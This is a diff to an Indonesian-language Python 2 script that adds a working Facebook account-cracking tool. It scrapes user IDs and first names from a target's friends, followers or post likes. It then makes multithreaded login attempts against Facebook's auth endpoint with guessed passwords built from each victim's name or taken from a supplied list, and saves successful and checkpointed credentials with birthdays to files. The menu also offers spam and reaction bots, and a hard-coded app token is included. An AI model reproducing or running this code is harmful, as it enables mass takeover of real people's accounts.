@@ -174,17 +174,272 @@ def __menu__():
 	print" \033[1;96m[\033[1;97m01\033[1;96m] \033[1;97mCrack dari ID publik"
 	print" \033[1;96m[\033[1;97m02\033[1;96m] \033[1;97mCrack dari ID followers"
 	print" \033[1;96m[\033[1;97m03\033[1;96m] \033[1;97mCrack dari likes postingan publik"
-	print" \033[1;96m[\033[1;97m04\033[1;96m] \033[1;97mCrack metode bruteforce (\033[1;96mbelum tersedia\033[1;97m)"
-	print" \033[1;96m[\033[1;97m05\033[1;96m] \033[1;97mCek hasil crack"
-	print" \033[1;96m[\033[1;97m06\033[1;96m] \033[1;97mCek konfirmasi identitas account facebook"
-	print" \033[1;96m[\033[1;97m07\033[1;96m] \033[1;97mCek ID"
-	print" \033[1;96m[\033[1;97m08\033[1;96m] \033[1;97mCek biodata pengguna account facebook"
-	print" \033[1;96m[\033[1;97m09\033[1;96m] \033[1;97mBot reaction"
-	print" \033[1;96m[\033[1;97m10\033[1;96m] \033[1;97mSpam unlimited "
+	print" \033[1;96m[\033[1;97m04\033[1;96m] \033[1;97mCek hasil crack"
+	print" \033[1;96m[\033[1;97m05\033[1;96m] \033[1;97mCek konfirmasi identitas account facebook"
+	print" \033[1;96m[\033[1;97m06\033[1;96m] \033[1;97mCek ID"
+	print" \033[1;96m[\033[1;97m07\033[1;96m] \033[1;97mBot reaction"
 	print" \033[1;97m[\033[1;96m00\033[1;97m] \033[1;96mRemove TOKEN/COOKIE"
 	print
 	pilih_india()
+
+def pilih_india():
+	ask = raw_input(" \033[1;96m[\033[1;97m?\033[1;96m] \033[1;96mPILIH \033[1;97m:\033[1;93m ")
+	if ask == "":
+		print
+		print ("\033[1;97mpilih yang benar.......!!!") 
+		exit()
+	elif ask == "1" or ask == "01":
+		print ("\n \033[1;97mketik '\33[3;1m\033[1;96mme\033[1;97m' \33[0;1mjika ingin crack dari daftar pencarian teman")
+		print
+		idt = raw_input(" \033[1;96m[\033[1;97m?\033[1;96m] \033[1;97mid publik :\033[1;93m ")
+		try:
+			pok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token)
+			sp = json.loads(pok.text)
+			print (" \033[1;96m[\033[1;97m!\033[1;96m]\033[1;97m nama      :\033[1;93m "+sp["name"]) 
+		except KeyError:
+			print ("     \033[1;97mmaaf id tidak publik") 
+			exit()
+		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+token)
+		z = json.loads(r.text)
+		for i in z["data"]:
+			uid = i['id']
+			na = i['name']
+			nm = na.rsplit(" ")[0]
+			id.append(uid+'|'+nm)
+	elif ask == "2" or ask == "02":
+		print ("\n \033[1;97mketik '\33[3;1m\033[1;96mme\033[1;97m' \33[0;1mjika ingin crack dari daftar pencarian teman")
+		print
+		idt = raw_input(" \033[1;96m[\033[1;97m?\033[1;96m] \033[1;97mid publik :\033[1;93m ")
+		try:
+			pok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token)
+			sp = json.loads(pok.text)
+			print (" \033[1;96m[\033[1;97m!\033[1;96m]\033[1;97m nama      :\033[1;93m "+sp["name"]) 
+		except KeyError:
+			print ("     \033[1;97mmaaf id tidak publik") 
+			exit()
+		r = requests.get("https://graph.facebook.com/"+idt+"/subscribers?limit=999999&access_token="+token)
+		z = json.loads(r.text)
+		for i in z["data"]:
+			uid = i['id']
+			na = i['name']
+			nm = na.rsplit(" ")[0]
+			id.append(uid+'|'+nm)
+	elif ask == "3" or ask == "03":
+		idt = raw_input(" \033[1;96m[\033[1;97m?\033[1;96m] \033[1;97mid publik :\033[1;93m ")
+		r = requests.get("https://graph.facebook.com/"+idt+"/likes?limit=9999999&access_token="+token)
+		z = json.loads(r.text)
+		for i in z['data']:
+			uid = i['id']
+			na = i['name']
+			nm = na.rsplit(" ")[0]
+			id.append(uid+'|'+nm)
+	elif ask == "4" or ask == "04":
+		menu_hack()	    
+	elif ask == "5" or ask == "05":
+		print
+		print" \033[1;96m[\033[1;97m1\033[1;96m]\033[1;97m lihat hasil \033[1;97m[\033[1;96mOK\033[1;97m]"
+		print" \033[1;96m[\033[1;97m2\033[1;96m]\033[1;97m lihat hasil \033[1;96m[\033[1;97mCP\033[1;96m]"
+		ress = raw_input(" \033[1;96m[\033[1;97m?\033[1;96m]\033[1;96m pilih \033[1;96m:\033[1;93m ")
+		if ress =="":
+			menu()
+		elif ress == "1" or ress == "01":
+			print ("\n [+] hasil \033[1;97[\033[1;96mOK\033[1;97]\033[1;97m tanggal : \033[1;96m%s-%s-%s\033[0;97m" % (ha, op, ta)) 
+			os.system("cat out/OK-%s-%s-%s.txt" % (ha, op, ta))
+			exit()
+		elif ress == "2" or ress == "02":
+			print (" [+] hasil \033[1;96m[\033[1;97mCP\033[1;96m]\033[1;97m tanggal : \033[1;96m%s-%s-%s\033[0;97m" % (ha, op, ta)) 
+			os.system("cat out/CP-%s-%s-%s.txt" % (ha, op, ta))
+			exit()
+	elif ask == "6" or ask == "06":
+		buatngecek()
+	elif ask == "7" or ask == "07":
+		print
+		print("\033[1;96m [\033[1;97m1\033[1;96m]\033[1;97m Cek ID teman ")
+		print("\033[1;96m [\033[1;97m2\033[1;96m]\033[1;97m Cek ID publik ")
+		d = raw_input("\n\033[1;96m [\033[1;97m?\033[1;96m] \033[1;96mpilih \033[1;96m:\033[1;93m ")
+		if d =='': 
+			exit()
+		elif d in['1','01']:
+			id_teman1()
+		elif d in['2','02']:
+			idfrom_teman1()
+		else:
+			print ("\033[1;97mpilih yang benar.......!!!") 
+			exit()
+	elif ask == "8" or ask == "08":
+		informasi()
+	elif ask == "9" or ask == "09":
+		 menu_bot()
+	elif ask == "10" or ask == "10":
+		menu_spam()
+	elif ask == "0" or ask == "00":
+		os.system("rm -f login.txt") 
+		print (" √   berhasil menghapus token") 
+		exit()		
 		
+	else:
+		print ("\033[1;97mpilih yang benar.......!!!") 
+		exit()
+	
+	print"\033[1;96m [\033[1;97m!\033[1;96m]\033[1;97m total id  :\033[1;93m " +str(len(id))
+	ask = raw_input("\n \033[1;96m[\033[1;97m?\033[1;96m]\033[1;97m ingin gunakan password manual (\033[1;92my\033[1;97m/\033[1;93mt\033[1;97m) : ")
+	if ask == "Y" or ask == "y":
+		manual()
+	print
+	print (" \033[1;97mmainkan data mode pesawat")
+	print (" \033[1;97mdi angka \033[1;96m100 \033[1;97mdan \033[1;96m2000 \033[1;97msaat menjalankan crack")
+	print(" \033[1;97mProses crack \33[3;1m\033[1;92msedang berjalan...\33[0;1m")
+	print
+
+	def main(arg):
+		global ok,cp,ua, loop
+		print '\r \033[1;97m¤  %s/%s \033[1;97m[\033[1;96mOK:%s\033[1;97m] - \033[1;96m[\033[1;97mCP:%s\033[1;96m]\033[1;97m ' % (loop, len(id), len(ok), len(cp)),
+		sys.stdout.flush()
+		user = arg
+		uid,name=user.split("|") 
+		try:
+			os.mkdir('out')
+		except OSError:
+			pass
+		try:
+			for pw in [name.lower()+'123',name.lower()+'12345']:
+				ua = random.choice(["Mozilla/5.0 (SymbianOS/9.3; Series60/3.2 NokiaE5-00/071.003; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/533.4 (KHTML, like Gecko) NokiaBrowser/7.3.1.26 Mobile Safari/533.4 3gpp-gba"])
+				headers_ = {'x-fb-connection-bandwidth': str(random.randint(20000000.0, 30000000.0)), 'x-fb-sim-hni': str(random.randint(20000, 40000)), 
+				'x-fb-net-hni': str(random.randint(20000, 40000)), 
+				'x-fb-connection-quality': 'EXCELLENT', 
+				'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA', 
+				'user-agent': ua, 
+				'content-type': 'application/x-www-form-urlencoded', 
+				'x-fb-http-engine': 'Liger'}
+				ses=requests.Session()
+				api="https://b-api.facebook.com/method/auth.login"
+				param={"access_token": "350685531728%7C62f8ce9f74b12f84c123cc23437a4a32","format": "JSON","sdk_version": "2","email":uid,"locale": "en_US","password":pw,"sdk": "ios","generate_session_cookies": "1","sig": "3f555f99fb61fcd7aa0c44f58f522ef6"}
+				send=ses.get(api,params=param, headers=headers_)
+				if "access_token" in send.text and "EAAA" in send.text:
+					print '\r\033[1;97m 👉 \033[1;97m[\033[1;96mOK\033[1;97m]\033[1;96m\033[1;96m ' +uid+ ' \033[1;97m◊\033[1;96m ' +pw+ '        '
+					ok.append(uid+' • '+pw)
+					save = open('out/OK-%s-%s-%s.txt' % (ha, op, ta),'a') 
+					save.write('\033[1;97m 👉 \033[1;97m[\033[1;96mOK\033[1;97m]\033[1;96m\033[1;96m '+str(uid)+' \033[1;97m◊\033[1;96m '+str(pw)+'\n')
+					save.close()
+					break
+					continue
+					continue
+				elif "www.facebook.com" in send.json()["error_msg"]:
+					try:
+						token = open('login.txt').read()
+						url = ("https://graph.facebook.com/"+uid+"?access_token="+token)
+						data = s.get(url).json()
+						nama = data['name']
+						ttl = data['birthday'].replace("/","-")
+						print('\r\033[0;97m 👉 \033[1;96m[\033[1;97mCP\033[1;96m]\033[1;97m\033[1;97m ' +uid+ ' \033[1;96m◊\033[1;97m ' + pw + ' \033[1;96m◊\033[1;97m ' + ttl)
+						cp.append(uid+'|'+pw+'|'+ttl)
+						save = open('out/CP-%s-%s-%s.txt' % (ha, op, ta),'a')
+						save.write('\033[0;97m 👉 \033[1;96m[\033[1;97mCP\033[1;96m]\033[1;97m\033[1;97m '+str(uid)+' \033[1;96m◊\033[1;97m '+str(pw)+' \033[1;96m◊\033[1;97m '+ttl+'\n')
+						open("CP/%s.txt"%(tanggal),"a").write("%s|%s|%s\n"%(uid, pw, ttl))
+						save.close()
+						break
+					except(KeyError, IOError):
+						ttl = ' '
+					except:pass
+					print '\r\033[0;97m 👉 \033[1;96m[\033[1;97mCP\033[1;96m]\033[1;97m\033[1;97m ' +uid+ ' \033[1;96m◊\033[1;97m ' + pw + '        '
+					cp.append(uid+'|'+pw)
+					save = open('out/CP-%s-%s-%s.txt' % (ha, op, ta),'a')
+					save.write('\033[0;97m 👉 \033[1;96m[\033[1;97mCP\033[1;96m]\033[1;97m\033[1;97m '+str(uid)+' \033[1;96m◊\033[1;97m '+str(pw)+'\n')
+					open("CP/%s.txt"%(tanggal),"a").write(" %s|%s\n"%(uid, pw))
+					save.close()
+					break
+					continue
+			
+			loop += 1
+		except:
+			pass
+	p = ThreadPool(30)
+	p.map(main, id)
+	print("\n crack selesai...")
+	print
+	print
+	exit()
+
+def manual():
+	print("\033[1;96m [\033[1;97m*\033[1;96m] \033[1;97mcontoh password : bangladesh,102030,786786")
+	pw = raw_input("\033[1;96m [\033[1;97m!\033[1;96m]\033[1;97m set password :\033[1;93m ").split(",")
+	print
+	if len(pw) ==0:
+		exit(" *  isi yang bener, tidak boleh kosong")
+	print("\033[1;97m jumlah password yang di buat : \033[1;93m" +str(len(pw)))
+	print (" \033[1;97mmainkan data mode pesawat")
+	print (" \033[1;97mdi angka \033[1;96m100 \033[1;97mdan \033[1;96m2000 \033[1;97msaat menjalankan crack")
+	print(" \033[1;97mProses crack \33[3;1m\033[1;92msedang berjalan...\33[0;1m")
+	print
+	
+	def main(arg):
+		global ok,cp,ua,loop
+		print '\r \033[1;97m¤  %s/%s \033[1;97m[\033[1;96mOK:%s\033[1;97m] - \033[1;96m[\033[1;97mCP:%s\033[1;96m]\033[1;97m ' % (loop, len(id), len(ok), len(cp)),
+		sys.stdout.flush()
+		user = arg
+		uid,name=user.split("|") 
+		try:
+			os.mkdir('out')
+		except OSError:
+			pass
+		try:
+			for asu in pw:
+				ua = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36'
+				headers_ = {'x-fb-connection-bandwidth': str(random.randint(20000000.0, 30000000.0)), 'x-fb-sim-hni': str(random.randint(20000, 40000)), 
+				'x-fb-net-hni': str(random.randint(20000, 40000)), 
+				'x-fb-connection-quality': 'EXCELLENT', 
+				'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA', 
+				'user-agent': ua, 
+				'content-type': 'application/x-www-form-urlencoded', 
+				'x-fb-http-engine': 'Liger'}
+				ses=requests.Session()
+				api="https://b-api.facebook.com/method/auth.login"
+				param={"access_token": "350685531728%7C62f8ce9f74b12f84c123cc23437a4a32","format": "JSON","sdk_version": "2","email":uid,"locale": "en_US","password":asu,"sdk": "ios","generate_session_cookies": "1","sig": "3f555f99fb61fcd7aa0c44f58f522ef6"}
+				send=ses.get(api,params=param, headers=headers_)
+				if "access_token" in send.text and "EAAA" in send.text:
+					print '\r\033[1;97m 👉 \033[1;97m[\033[1;96mOK\033[1;97m]\033[1;96m\033[1;96m ' +uid+ ' \033[1;97m◊\033[1;92m ' + asu + '        '
+					ok.append(uid+' • '+asu)
+					save = open('out/OK-%s-%s-%s.txt' % (ha, op, ta),'a') 
+					save.write('\r\033[1;97m 👉 \033[1;97m[\033[1;96mOK\033[1;97m]\033[1;96m\033[1;96m '+str(uid)+' \033[1;97m◊\033[1;96m '+str(asu)+'\n')
+					save.close()
+					break
+					continue
+					continue
+				elif "www.facebook.com" in send.json()["error_msg"]:
+					try:
+						token = open('login.txt').read()
+						url = ("https://graph.facebook.com/"+uid+"?access_token="+token)
+						data = s.get(url).json()
+						nama = data['name']
+						ttl = data['birthday'].replace("/","-")
+						print('\r\033[1;97m 👉 \033[1;96m[\033[1;97mCP\033[1;96m]\033[1;97m\033[1;97m ' +uid+ ' \033[1;96m◊\033[1;97m ' + asu + ' \033[1;96m◊\033[1;97m ' + ttl)
+						cp.append(uid+'|'+asu+'|'+ttl)
+						save = open('out/CP-%s-%s-%s.txt' % (ha, op, ta),'a')
+						save.write('\033[1;97m 👉 \033[1;96m[\033[1;97mCP\033[1;96m]\033[1;97m\033[1;97m '+str(uid)+' \033[1;96m◊\033[1;97m '+str(pw)+'\n')
+						open("CP/%s.txt"%(tanggal),"a").write("%s|%s|%s\n"%(uid, asu, ttl))
+						save.close()
+						break
+					except(KeyError, IOError):
+						ttl = ' '
+					except:pass
+					print '\r\033[1;97m 👉 \033[1;96m[\033[1;97mCP\033[1;96m]\033[1;97m\033[1;97m ' +uid+ ' \033[1;96m◊\033[1;97m ' + asu + '        '
+					cp.append(uid+'|'+asu)
+					save = open('out/CP-%s-%s-%s.txt' % (ha, op, ta),'a')
+					save.write('\033[1;97m 👉 \033[1;96m[\033[1;97mCP\033[1;96m]\033[1;97m\033[1;97m '+str(uid)+' \033[1;96m◊\033[1;97m '+str(pw)+'\n')
+					open("CP/%s.txt"%(tanggal),"a").write(" %s|%s\n"%(uid, asu))
+					save.close()
+					break
+					continue
+			
+			loop += 1
+		except:
+			pass
+	p = ThreadPool(30)
+	p.map(main, id)
+	print("\n crack selesai...")
+	print
+	print
+	exit()
 #------->login token jangan lupa masukin token facebook jangan token listrik kontol<-------#     
 			
 if __name__ == '__main__':
